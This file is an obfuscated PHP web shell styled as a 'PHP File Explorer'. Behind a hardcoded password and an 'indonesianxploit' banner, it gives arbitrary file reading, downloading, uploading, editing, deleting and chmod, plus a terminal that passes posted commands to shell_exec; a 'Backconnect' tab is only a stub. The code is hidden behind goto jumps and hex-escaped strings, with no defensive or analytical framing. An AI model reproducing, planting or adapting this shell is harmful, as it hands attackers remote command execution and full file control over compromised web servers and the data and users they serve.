<?php eval(base64_decode('
 goto W0o6Z; Ypj2D: R4DTk: goto vN1ot; yUVSV: if (isset($_GET["\x72\x65\x61\x64\146\151\x6c\145"])) { $f = $_GET["\162\145\141\144\x66\x69\x6c\145"]; if (file_exists($f) && is_file($f)) { header("\x43\157\156\164\145\x6e\x74\x2d\124\171\160\x65\x3a\x20\164\x65\170\164\x2f\x70\x6c\x61\151\x6e"); echo file_get_contents($f); } else { http_response_code(404); echo "\x46\x69\154\x65\40\x6e\157\x74\x20\x66\157\165\156\144"; } die; } goto zgKMu; zFw5Z: goto FnN9s; goto q2u_V; hh180: if (isset($_POST["\143\150\155\x6f\x64\x5f\164\x61\162\x67\x65\164"], $_POST["\143\150\155\x6f\x64\x5f\155\x6f\144\x65"])) { $target = $_POST["\143\150\x6d\x6f\x64\137\x74\x61\162\147\145\x74"]; $mode = octdec($_POST["\143\x68\155\x6f\x64\x5f\155\x6f\144\x65"]); if (file_exists($target)) { chmod($target, $mode); } header("\x4c\x6f\143\x61\x74\151\157\x6e\72\40\x3f\x64\151\x72\x3d" . urlencode($dir)); die; } goto rFxaY; q2u_V: m7FXT: goto hRgiu; SbYCy: LvdFX: goto RRmOh; d_cx1: YcR3v: goto hyNXA; aqlIw: goto H6evu; goto U90Ue; xqJF7: if (isset($_POST["\162\x65\x6e\141\x6d\x65\137\157\154\144"], $_POST["\162\x65\x6e\x61\155\x65\137\156\x65\x77"])) { $old = $_POST["\162\x65\x6e\x61\x6d\145\x5f\157\154\x64"]; $new = dirname($old) . "\x2f" . basename($_POST["\162\x65\156\x61\x6d\145\137\x6e\145\x77"]); if (file_exists($old) && !file_exists($new)) { rename($old, $new); } header("\x4c\x6f\143\x61\164\x69\x6f\x6e\72\40\77\144\151\162\x3d" . urlencode($dir)); die; } goto uv0jk; kyUXf: goto LvdFX; goto vTzUa; dNUor: function pathBreadcrumb($dir) { $parts = explode(DIRECTORY_SEPARATOR, $dir); $path = ''; $crumbs = array(); foreach ($parts as $part) { if ($part === '') { continue; } $path .= DIRECTORY_SEPARATOR . $part; $crumbs[] = "\74\141\40\x68\x72\x65\x66\75\47\x3f\144\151\162\x3d" . urlencode($path) . "\x27\76" . htmlspecialchars($part) . "\x3c\x2f\x61\76"; } return implode("\40\x2f\x20", $crumbs); } goto ezYK9; KcQ26: goto N9xUF; goto siwdu; oq5PO: F_0eC: goto C8lA6; uLEi1: xhBQZ: goto TBX7n; KZ4GZ: dDwnT: goto pnPGs; nVWWz: bzOsX: goto f8kH_; ZKBDC: XoVny: goto l0Lx8; hRgiu: $dir = isset($_GET["\144\x69\x72"]) && is_dir($_GET["\144\x69\162"]) ? $_GET["\144\x69\162"] : getcwd(); goto SFyZ9; pnPGs: if (isset($_GET["\144\x6f\x77\156\x6c\157\141\144"])) { $f = $_GET["\x64\157\x77\156\x6c\157\141\x64"]; if (is_file($f)) { header("\103\x6f\156\x74\145\x6e\x74\55\x54\x79\160\145\72\40\x61\160\160\x6c\x69\143\141\x74\x69\x6f\156\57\157\143\x74\145\164\x2d\163\x74\x72\145\141\155"); header("\103\157\x6e\x74\145\156\164\x2d\x44\151\163\x70\157\163\151\164\151\157\x6e\x3a\40\141\x74\x74\x61\x63\x68\x6d\145\156\x74\x3b\40\146\151\x6c\x65\x6e\x61\x6d\145\75\42" . basename($f) . "\x22"); header("\103\157\x6e\x74\x65\x6e\164\55\x4c\x65\x6e\x67\x74\150\72\40" . filesize($f)); readfile($f); die; } } goto aqlIw; GFTTN: F4TCn: goto DoUxe; ezYK9: goto rOZs7; goto tzcRr; uv0jk: goto C6I0O; goto oq5PO; SIYOH: zMMSN: goto XXkVj; c97cD: hrMnq: goto T_Ef8; Hf2Yt: Lfur7: goto BjMKk; E9VuD: BE0d1: goto dNUor; JC12L: if ($_SERVER["\122\105\x51\125\x45\x53\124\137\115\105\x54\x48\x4f\104"] === "\x50\x4f\123\124" && isset($_FILES["\146\x69\x6c\145\x54\157\125\160\x6c\x6f\141\144"])) { $uploadDir = $dir . DIRECTORY_SEPARATOR; $targetFile = $uploadDir . basename($_FILES["\x66\151\x6c\x65\x54\157\x55\160\154\x6f\141\144"]["\x6e\141\155\x65"]); if ($_FILES["\146\151\154\x65\124\157\x55\x70\x6c\157\x61\x64"]["\163\x69\172\145"] > 5 * 1024 * 1024) { $uploadMsg = "\74\x70\x20\x73\164\171\x6c\x65\x3d\x27\x63\157\x6c\x6f\x72\x3a\162\x65\144\x3b\47\76\105\162\162\157\x72\72\x20\106\x69\x6c\145\40\164\145\x72\x6c\141\154\x75\40\142\x65\163\141\162\40\x28\x6d\x61\x78\40\x35\x4d\x42\x29\56\74\57\x70\x3e"; } else { if (move_uploaded_file($_FILES["\x66\x69\154\x65\x54\x6f\125\160\x6c\x6f\141\x64"]["\x74\155\x70\x5f\156\141\x6d\145"], $targetFile)) { $uploadMsg = "\74\x70\x20\x73\164\x79\x6c\x65\x3d\x27\143\x6f\154\157\162\72\x67\162\145\x65\x6e\73\47\x3e\x46\x69\154\145\40" . htmlspecialchars(basename($_FILES["\x66\151\154\x65\124\x6f\x55\160\154\157\141\x64"]["\156\141\155\x65"])) . "\x20\142\x65\162\x68\141\163\151\x6c\x20\144\151\x75\160\154\x6f\x61\144\56\74\x2f\x70\76"; } else { $uploadMsg = "\74\x70\40\x73\x74\x79\x6c\x65\x3d\47\143\157\154\x6f\162\72\162\x65\144\73\47\76\x45\162\162\x6f\162\40\x73\x61\x61\x74\x20\x6d\x65\156\147\165\160\154\x6f\x61\x64\40\x66\151\x6c\x65\x2e\x3c\x2f\x70\76"; } } } goto CWMXJ; z1WlO: goto F_0eC; goto c97cD; wRNkY: H6evu: goto yUVSV; Ta0Re: goto dDwnT; goto MHdbN; SFyZ9: goto aJzUL; goto wRNkY; HkHxv: goto CeIcr; goto gvkBP; U90Ue: qlM7v: goto gO9pe; CLO71: goto sPEOV; goto xEIf7; tzcRr: ku9Dh: goto uSANp; C8lA6: echo pathBreadcrumb($dir); goto xj8ct; TBX7n: function deleteDirectory($dir) { if (!file_exists($dir)) { return; } if (!is_dir($dir)) { return unlink($dir); } foreach (scandir($dir) as $item) { if (in_array($item, array("\x2e", "\56\x2e"))) { continue; } deleteDirectory($dir . "\57" . $item); } rmdir($dir); } goto UlY7X; uSANp: $password = "\107\x61\x6e\x74\145\x6e\147\x31\62\63\100\100\x23\43"; goto xQbT3; W0o6Z: goto bzOsX; goto ZKBDC; Rjq9o: ?>
<section aria-labelledby="tabBtn2"class="tab-content"id="tab-2"role="tabpanel"tabindex="0"><h2>Upload File</h2><?php  goto kyUXf; siwdu: C6I0O: goto hh180; xEIf7: N9xUF: goto Rjq9o; T_Ef8: function formatSize($bytes) { $sizes = array("\x42", "\113\x42", "\115\102", "\107\x42", "\x54\102"); $i = 0; while ($bytes >= 1024 && $i < count($sizes) - 1) { $bytes /= 1024; $i++; } return round($bytes, 2) . "\x20" . $sizes[$i]; } goto HkHxv; Bo1N8: PF8ZE: goto clZHs; f8kH_: error_reporting(0); goto andnS; YiCNy: goto VA3on; goto LRchc; vTzUa: sPEOV: goto X0yZF; Bh7nZ: goto liwrd; goto Bo1N8; vN1ot: session_start(); goto l_GYB; m7BD3: goto bitsr; goto d_cx1; jHcmi: goto Lfur7; goto R3_X7; GMux1: goto xhBQZ; goto eMd3O; otTBh: echo $folderMsg ?? ''; goto YiCNy; E5vYz: ?>
<form method="post"><input required name="new_folder_name"placeholder="Folder Name"> <button class="btn"type="submit">Create Folder</button></form><hr><h2>Create File</h2><?php  goto jHcmi; CWMXJ: goto qlM7v; goto uLEi1; eMd3O: aJzUL: goto gBIDE; NBT9Q: goto zMMSN; goto E9VuD; andnS: goto ku9Dh; goto SIYOH; RRmOh: echo $uploadMsg ?? ''; goto AnUSE; xj8ct: goto YcR3v; goto Ypj2D; gtFQu: goto m7FXT; goto SbYCy; f3IZp: VA3on: goto E5vYz; DoUxe: if (!isset($_SESSION["\154\157\x67\x67\145\x64\x5f\151\156"]) && (!isset($_POST["\160\x61\163\163"]) || $_POST["\x70\141\163\x73"] !== $password)) { echo "\x3c\143\x65\156\x74\x65\x72\76\12\11\74\160\x72\145\76\xa\x20\137\x5f\x5f\137\137\137\137\137\x5f\137\x5f\x5f\137\137\137\137\137\137\137\x5f\137\x5f\x5f\x5f\x5f\137\137\12\x3c\x20\162\x6f\157\164\x40\151\156\144\x6f\x6e\x65\x73\x69\x61\156\x78\x70\154\x6f\151\164\x7e\171\157\x75\x72\144\162\x65\64\155\x37\x20\x3e\xa\40\55\x2d\55\55\x2d\55\55\55\55\55\55\x2d\55\x2d\55\55\x2d\x2d\x2d\55\x2d\x2d\x2d\55\55\x2d\55\xa\x9\74\x2f\x70\x72\145\x3e\74\146\x6f\x72\x6d\x20\155\145\x74\x68\x6f\144\x3d\42\160\x6f\163\x74\42\x3e\x3c\x69\156\160\x75\x74\40\164\171\160\x65\x3d\x22\x70\x61\163\163\167\x6f\162\144\42\x20\156\141\x6d\x65\x3d\x22\x70\141\x73\163\x22\x3e\74\x62\165\x74\164\x6f\x6e\x20\x74\171\x70\x65\x3d\x22\163\165\142\x6d\151\x74\x22\x3e\114\x6f\147\x69\x6e\x3c\57\142\165\x74\x74\157\156\76\74\57\146\x6f\162\155\76\74\57\x63\x65\x6e\x74\x65\162\x3e"; die; } else { $_SESSION["\x6c\157\x67\147\x65\x64\x5f\x69\x6e"] = true; } goto Bh7nZ; l_GYB: goto F4TCn; goto nVWWz; gBIDE: if (isset($_GET["\x64\145\x6c\x65\x74\145"])) { $p = $_GET["\x64\145\154\x65\x74\x65"]; if (is_dir($p)) { deleteDirectory($p); } else { unlink($p); } header("\x4c\x6f\143\141\x74\x69\157\156\x3a\x20\x3f\x64\x69\x72\75" . urlencode($dir)); die; } goto Ta0Re; hyNXA: ?>
<main><div class="tabs"role="tablist"aria-label="File Explorer Tabs"><button class="tab-button active"id="tabBtn1"aria-controls="tab-1"aria-selected="true"role="tab">Explorer</button> <button class="tab-button"id="tabBtn2"aria-controls="tab-2"aria-selected="false"role="tab">Upload</button> <button class="tab-button"id="tabBtn3"aria-controls="tab-3"aria-selected="false"role="tab">Terminal</button> <button class="tab-button"id="tabBtn4"aria-controls="tab-4"aria-selected="false"role="tab">Create Folder/File</button> <button class="tab-button"id="tabBtn5"aria-controls="tab-5"aria-selected="false"role="tab">Backconnect</button></div><section aria-labelledby="tabBtn1"class="tab-content active"id="tab-1"role="tabpanel"tabindex="0"><?php  goto Q1BOg; pJK6u: fH3GS: goto xqJF7; TCtm9: function renderTable($dir) { $rows = ''; foreach (scandir($dir) as $f) { if (in_array($f, array("\56", "\x2e\x2e"))) { continue; } $p = $dir . "\x2f" . $f; $isDir = is_dir($p); $size = $isDir ? "\x2d" : formatSize(filesize($p)); $mod = date("\x59\x2d\155\55\x64\x20\x48\72\x69\72\x73", filemtime($p)); $perm = substr(sprintf("\x25\157", fileperms($p)), -4); $rows .= "\xa\74\164\162\x3e\xa\40\40\x3c\164\144\x3e\74\x61\x20\x68\x72\145\146\x3d\x27" . ($isDir ? "\x3f\x64\151\x72\75" . urlencode($p) : "\43") . "\47\x3e" . htmlspecialchars($f) . "\74\57\x61\76\74\x2f\x74\x64\x3e\xa\40\x20\74\164\x64\76{$size}\x3c\x2f\x74\144\76\12\40\x20\74\x74\x64\x3e{$mod}\x3c\x2f\164\144\76\12\40\x20\x3c\164\x64\x3e\74\x63\157\x64\x65\76{$perm}\74\57\143\157\x64\145\x3e\74\57\164\144\x3e\12\x20\40\74\164\x64\76\12\x20\40\x20\40" . (!$isDir ? "\74\141\x20\x68\162\145\x66\x3d\47\77\x64\x6f\167\156\154\157\x61\x64\75" . urlencode($p) . "\x27\76\104\157\x77\156\154\x6f\141\144\74\57\x61\76\x20\174\40" : '') . "\xa\40\40\x20\x20\x3c\x61\40\150\162\145\146\75\x27\x3f\144\x65\154\145\x74\145\75" . urlencode($p) . "\46\x64\151\x72\75" . urlencode($dir) . "\x27\x20\x6f\156\x63\x6c\x69\143\153\75\47\x72\x65\x74\x75\162\156\x20\x63\x6f\x6e\x66\151\x72\x6d\50\x22\104\145\x6c\x65\164\x65\x20" . htmlspecialchars($f) . "\x3f\42\51\x27\40\163\164\171\154\145\75\x27\x63\157\154\x6f\x72\x3a\x72\145\x64\73\x27\x3e\104\145\154\145\x74\145\74\x2f\x61\x3e\x20\x7c\12\x20\40\x20\40\74\x61\x20\x68\x72\145\146\75\47\43\47\40\157\x6e\x63\x6c\x69\x63\153\75\47\x72\x65\156\x61\x6d\145\x50\162\157\x6d\160\x74\x28\42" . addslashes($p) . "\x22\x2c\42" . addslashes($f) . "\42\51\47\x3e\122\x65\x6e\141\x6d\145\x3c\x2f\x61\76\40\x7c\xa\40\x20\40\40\x3c\x61\40\x68\162\x65\146\x3d\x27\43\x27\x20\x6f\x6e\x63\154\x69\143\153\x3d\x27\x63\150\155\157\x64\120\x72\157\155\160\x74\x28\x22" . addslashes($p) . "\x22\x2c\x22{$perm}\x22\51\x27\x3e\103\x68\x6d\157\144\74\57\x61\x3e" . (!$isDir ? "\x20\174\40\x3c\x61\40\x68\162\x65\146\x3d\47\x23\x27\40\157\156\x63\154\x69\x63\153\75\x27\145\x64\151\x74\120\162\157\x6d\x70\x74\50\42" . addslashes($p) . "\42\51\x27\76\105\144\x69\164\74\x2f\x61\x3e" : '') . "\xa\40\40\74\x2f\164\x64\76\xa\74\x2f\x74\162\76"; } return "\74\164\141\142\154\x65\76\12\x20\40\40\40\x3c\x74\x68\145\x61\x64\76\x3c\x74\162\76\74\x74\150\x3e\116\141\155\x65\x3c\57\164\x68\x3e\x3c\x74\x68\x3e\x53\x69\172\x65\74\57\x74\150\x3e\x3c\164\150\76\115\x6f\x64\151\x66\x69\x65\x64\x3c\57\164\150\76\x3c\164\150\x3e\120\x65\x72\x6d\74\x2f\x74\x68\76\74\164\x68\x3e\101\143\164\151\x6f\156\74\57\164\x68\76\74\57\x74\x72\x3e\74\x2f\164\150\x65\x61\144\76\12\40\x20\x20\40\74\x74\142\x6f\x64\x79\x3e{$rows}\74\x2f\164\x62\x6f\144\171\x3e\12\x20\x20\40\x20\x3c\57\164\x61\x62\x6c\x65\76"; } goto sdvzc; zgKMu: goto fH3GS; goto KZ4GZ; gvkBP: bitsr: goto otTBh; X0yZF: if (isset($_POST["\156\x65\167\137\146\x69\154\x65\x5f\156\x61\155\x65"])) { $newFile = $dir . DIRECTORY_SEPARATOR . basename($_POST["\x6e\145\x77\x5f\x66\151\154\x65\x5f\156\x61\155\x65"]); if (!file_exists($newFile)) { file_put_contents($newFile, ''); header("\114\157\143\141\x74\x69\x6f\x6e\72\x20\x3f\144\x69\162\75" . urlencode($dir)); die; } else { $fileMsg = "\x3c\160\40\163\164\171\154\x65\x3d\x27\143\157\x6c\x6f\162\72\162\x65\144\x3b\47\76\x46\x69\x6c\145\x20\163\x75\x64\141\x68\40\x61\x64\141\x2e\x3c\57\x70\76"; } } goto GMux1; rFxaY: goto XoVny; goto YZWQg; BjMKk: echo $fileMsg ?? ''; goto NBT9Q; sQ9_p: echo renderTable($dir); goto KcQ26; xQbT3: goto R4DTk; goto GFTTN; Q1BOg: goto jRUbW; goto f3IZp; MHdbN: rOZs7: goto SycH3; AnUSE: goto PF8ZE; goto pJK6u; l0Lx8: if (isset($_POST["\x65\144\x69\x74\x5f\160\141\x74\x68"], $_POST["\145\x64\151\164\137\x63\x6f\x6e\x74\145\156\164"])) { file_put_contents($_POST["\145\x64\x69\x74\137\160\x61\164\150"], $_POST["\145\144\x69\x74\137\x63\157\156\x74\145\156\x74"]); header("\x4c\x6f\143\141\x74\x69\157\x6e\x3a\x20\77\144\x69\162\75" . urlencode($dir)); die; } goto zFw5Z; YZWQg: CeIcr: goto TCtm9; sdvzc: goto BE0d1; goto sSz_t; LRchc: jRUbW: goto sQ9_p; clZHs: ?>
<form method="post"enctype="multipart/form-data"><input required name="fileToUpload"type="file"><br><br><button class="btn"type="submit">Upload</button></form></section><section aria-labelledby="tabBtn3"class="tab-content"id="tab-3"role="tabpanel"tabindex="0"><h2>Terminal</h2><input id="terminalCommand"placeholder="Enter command"> <button class="btn"id="runCmdBtn">Run</button><pre id="terminalOutput"></pre></section><section aria-labelledby="tabBtn4"class="tab-content"id="tab-4"role="tabpanel"tabindex="0"><h2>Create Folder</h2><?php  goto m7BD3; gO9pe: if (isset($_POST["\x6e\x65\x77\x5f\x66\157\x6c\x64\145\162\137\x6e\141\155\x65"])) { $newFolder = $dir . DIRECTORY_SEPARATOR . basename($_POST["\156\x65\167\x5f\146\157\x6c\144\145\162\137\x6e\141\155\145"]); if (!file_exists($newFolder)) { mkdir($newFolder); header("\x4c\157\x63\x61\x74\151\157\x6e\x3a\x20\x3f\144\x69\x72\75" . urlencode($dir)); die; } else { $folderMsg = "\x3c\x70\40\x73\164\x79\x6c\x65\x3d\x27\x63\157\154\157\x72\72\162\145\x64\73\x27\76\x46\157\x6c\x64\145\162\x20\163\165\144\141\150\x20\x61\144\141\56\74\57\x70\x3e"; } } goto CLO71; R3_X7: liwrd: goto vf1H7; UlY7X: goto hrMnq; goto Hf2Yt; sSz_t: FnN9s: goto JC12L; SycH3: ?>
<!doctypehtml><html lang="en"><head><meta charset="UTF-8"><title>PHP File Explorer</title><style>*{box-sizing:border-box}body{font-family:'Segoe UI',Tahoma,Geneva,Verdana,sans-serif;background-color:#121212;color:#eee;margin:0;padding:0}a{color:#67e167;text-decoration:none}a:hover{text-decoration:underline}header{background:#1f1f1f;padding:10px 20px;font-size:1.2rem;font-weight:600;user-select:none}main{padding:20px}table{width:100%;border-collapse:collapse;margin-top:15px}td,th{border:1px solid #333;padding:10px;text-align:center;font-family:monospace}th{background:#222}tbody tr:hover{background-color:#222}.tabs{display:flex;gap:10px;margin-bottom:20px;flex-wrap:wrap}.tab-button{background:#222;color:#ccc;border:none;padding:10px 15px;cursor:pointer;border-radius:6px 6px 0 0;font-weight:600;transition:background-color .3s}.tab-button:hover{background:#67e167;color:#121212}.tab-button.active{background:#67e167;color:#121212}.tab-content{background:#222;border-radius:0 6px 6px 6px;padding:20px;display:none;min-height:400px}.tab-content.active{display:block}input[type=file],input[type=text],textarea{width:100%;background:#121212;border:1px solid #555;color:#eee;padding:8px 10px;border-radius:4px;font-family:monospace}input[type=text]:focus,textarea:focus{outline:2px solid #67e167;background:#1a1a1a}button.btn{background:#67e167;border:none;color:#121212;padding:8px 15px;border-radius:5px;cursor:pointer;font-weight:600;transition:background-color .3s}button.btn:hover{background:#55c255}.modal{position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,.7);display:none;justify-content:center;align-items:center;z-index:1000}.modal-content{background:#222;border-radius:8px;padding:20px;width:500px;max-width:90%;color:#eee;font-family:monospace}.modal-content h3{margin-top:0}.modal-content input,.modal-content textarea{margin:10px 0}.modal-content button{margin-right:10px}.modal-content .cancel{background:#e55353;color:#fff}#terminalOutput{background:#000;color:#0f0;height:300px;overflow-y:auto;padding:10px;font-family:monospace;border-radius:6px}#breadcrumb{margin-bottom:10px;font-family:monospace}@media (max-width:600px){.tab-button{flex:1 1 100%;border-radius:0}.modal-content{width:95%}}</style></head><body><header>Current Directory : <span id="breadcrumb"><?php  goto z1WlO; vf1H7: if (isset($_POST["\141\152\141\170\137\x74\145\162\155\x69\156\x61\x6c\x5f\143\155\x64"])) { $cmd = $_POST["\x61\x6a\x61\170\137\x74\x65\162\155\151\156\x61\154\137\143\x6d\144"]; $output = shell_exec($cmd . "\40\x32\x3e\46\61"); echo htmlspecialchars($output); die; } goto gtFQu; XXkVj: ?>
<form method="post"><input required name="new_file_name"placeholder="File Name"> <button class="btn"type="submit">Create File</button></form></section><section aria-labelledby="tabBtn5"class="tab-content"id="tab-5"role="tabpanel"tabindex="0"><h2>Backconnect</h2><p><i>Fitur Backconnect bisa kamu sesuaikan sendiri. Contoh di bawah ini adalah template input sederhana.</i></p><form id="backconnectForm"><label>IP / Hostname:</label> <input required id="backconnect_host"placeholder="127.0.0.1"> <label>Port:</label> <input required id="backconnect_port"type="number"placeholder="4444"> <button class="btn"type="submit">Connect</button></form><pre id="backconnectOutput"style="background:#111;color:#67e167;height:250px;overflow:auto;padding:10px;margin-top:10px;border-radius:6px;font-family:monospace"></pre></section></main><div class="modal"role="dialog"aria-labelledby="modalRenameTitle"aria-modal="true"id="modalRename"><div class="modal-content"><h3 id="modalRenameTitle">Rename</h3><form method="post"id="renameForm"><input required name="rename_old"id="renameOld"type="hidden"> <input required name="rename_new"id="renameNew"><br><br><button class="btn"type="submit">Rename</button> <button class="btn cancel"type="button"onclick='closeModal("modalRename")'>Cancel</button></form></div></div><div class="modal"role="dialog"aria-labelledby="modalChmodTitle"aria-modal="true"id="modalChmod"><div class="modal-content"><h3 id="modalChmodTitle">Change Permissions</h3><form method="post"id="chmodForm"><input required name="chmod_target"id="chmodTarget"type="hidden"> <input required name="chmod_mode"id="chmodMode"pattern="[0-7]{3,4}"title="Enter valid octal permission (e.g. 0755 or 755)"><br><br><button class="btn"type="submit">Change</button> <button class="btn cancel"type="button"onclick='closeModal("modalChmod")'>Cancel</button></form></div></div><div class="modal"role="dialog"aria-labelledby="modalEditTitle"aria-modal="true"id="modalEdit"><div class="modal-content"><h3 id="modalEditTitle">Edit File</h3><form method="post"id="editForm"><input required name="edit_path"id="editPath"type="hidden"> <textarea id="editContent"name="edit_content"required rows="15"></textarea><br><button class="btn"type="submit">Save</button> <button class="btn cancel"type="button"onclick='closeModal("modalEdit")'>Cancel</button></form></div></div><script>// Tabs logic
  const tabs = document.querySelectorAll('.tab-button');
  const contents = document.querySelectorAll('.tab-content');

  tabs.forEach(tab => {
    tab.addEventListener('click', () => {
      tabs.forEach(t => {
        t.classList.remove('active');
        t.setAttribute('aria-selected', 'false');
      });
      contents.forEach(c => c.classList.remove('active'));

      tab.classList.add('active');
      tab.setAttribute('aria-selected', 'true');
      document.getElementById(tab.getAttribute('aria-controls')).classList.add('active');
    });
  });

  // Modals functions
  function openModal(id) {
    document.getElementById(id).style.display = 'flex';
  }
  function closeModal(id) {
    document.getElementById(id).style.display = 'none';
  }

  // Rename prompt
  function renamePrompt(oldPath, oldName) {
    openModal('modalRename');
    document.getElementById('renameOld').value = oldPath;
    document.getElementById('renameNew').value = oldName;
    document.getElementById('renameNew').focus();
  }

  // Chmod prompt
  function chmodPrompt(target, currentPerm) {
    openModal('modalChmod');
    document.getElementById('chmodTarget').value = target;
    document.getElementById('chmodMode').value = currentPerm;
    document.getElementById('chmodMode').focus();
  }

  // Edit prompt (fetch file content)
  function editPrompt(path) {
    fetch('?readfile=' + encodeURIComponent(path))
    .then(res => res.text())
    .then(text => {
      openModal('modalEdit');
      document.getElementById('editPath').value = path;
      document.getElementById('editContent').value = text;
      document.getElementById('editContent').focus();
    })
    .catch(() => alert('Failed to load file'));
  }

  // Terminal command
  const runBtn = document.getElementById('runCmdBtn');
  const terminalInput = document.getElementById('terminalCommand');
  const terminalOutput = document.getElementById('terminalOutput');

  function runCommand() {
    const cmd = terminalInput.value.trim();
    if (!cmd) return;
    terminalOutput.textContent += `$ ${cmd}\n`;
    terminalInput.value = '';
    fetch('', {
      method: 'POST',
      headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
      body: new URLSearchParams({ ajax_terminal_cmd: cmd })
    })
    .then(res => res.text())
    .then(out => {
      terminalOutput.textContent += out + '\n';
      terminalOutput.scrollTop = terminalOutput.scrollHeight;
    })
    .catch(() => {
      terminalOutput.textContent += 'Error executing command\n';
    });
  }

  runBtn.addEventListener('click', runCommand);
  terminalInput.addEventListener('keydown', e => {
    if (e.key === 'Enter') {
      e.preventDefault();
      runCommand();
    }
  });

  // Backconnect Form (dummy)
  const bcForm = document.getElementById('backconnectForm');
  const bcOutput = document.getElementById('backconnectOutput');
  bcForm.addEventListener('submit', e => {
    e.preventDefault();
    const host = document.getElementById('backconnect_host').value.trim();
    const port = document.getElementById('backconnect_port').value.trim();
    if (!host || !port) return alert('Fill both host and port!');
    bcOutput.textContent += `Attempting backconnect to ${host}:${port}...\n(This is a demo, implement your logic)\n`;
    bcOutput.scrollTop = bcOutput.scrollHeight;
  });</scrip')); ?>
